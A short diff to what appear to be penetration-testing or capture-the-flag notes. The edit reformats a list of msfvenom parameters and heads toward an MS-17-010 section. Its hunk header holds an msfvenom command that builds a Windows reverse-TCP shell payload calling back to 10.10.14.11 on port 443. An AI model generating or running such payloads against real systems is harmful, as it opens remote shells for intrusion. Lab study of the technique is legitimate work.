@@ -40,26 +40,15 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=443 EXITFUNC=threa
 
 The parameters are:
 
-`
-p:
-
-LHOST:
-
-LPORT:
-
-EXITFUNC:
-
-b:
-
-f:
-
-v:
-
-a:
-
-platform:
-
-`
+* -p: Type of payload (Single payload, you can learn about this [here](https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work) )
+* LHOST:
+* LPORT:
+* EXITFUNC:
+* -b:
+* -f:
+* -v:
+* -a:
+* --platform:
 
 ## MS-17-010
 
